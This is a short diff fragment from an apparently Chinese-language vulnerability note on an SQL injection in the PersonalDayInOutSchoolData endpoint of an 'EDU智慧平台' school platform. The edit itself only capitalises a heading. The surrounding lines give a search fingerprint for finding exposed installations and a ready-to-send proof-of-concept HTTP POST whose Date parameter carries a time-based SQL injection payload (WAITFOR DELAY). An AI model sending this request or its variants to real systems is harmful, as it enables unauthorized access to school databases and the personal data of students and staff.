@@ -8,7 +8,7 @@ EDU智慧平台PersonalDayInOutSchoolData存在SQL注入漏洞，允许攻击者
 body="custom/blue/uimaker/easyui.css"
 ```
 
-## poc
+## POC
 
 ```javascript
 POST /ashx/APP/InOutSchoolService.ashx?action=PersonalDayInOutSchoolData&Date=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--&AccountNo=1 HTTP/1.1
